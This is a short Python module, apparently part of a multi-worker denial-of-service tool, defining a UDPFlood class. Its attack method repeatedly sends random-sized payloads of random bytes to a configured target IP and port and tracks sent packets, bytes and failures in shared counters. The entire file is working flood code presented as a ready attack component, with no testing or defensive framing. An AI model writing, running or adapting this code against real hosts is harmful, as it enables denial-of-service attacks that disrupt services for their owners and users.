import socket
import random
import time

class UDPFlood:
    def __init__(self, args, config, stats, running, worker_id):
        self.target = args.target
        self.port = args.port
        self.config = config.get('udp', {})
        self.stats = stats
        self.running = running
        self.worker_id = worker_id
        
    def attack(self):
        min_size = self.config.get('min_size', 512)
        max_size = self.config.get('max_size', 1472)
        
        while self.running.value:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload_size = random.randint(min_size, max_size)
                payload = random.randbytes(payload_size)
                
                sock.sendto(payload, (self.target, self.port))
                
                with self.stats['sent'].get_lock():
                    self.stats['sent'].value += 1
                    self.stats['bps'].value += payload_size
                    
                sock.close()
                
            except Exception:
                with self.stats['failed'].get_lock():
                    self.stats['failed'].value += 1
                time.sleep(0.001)
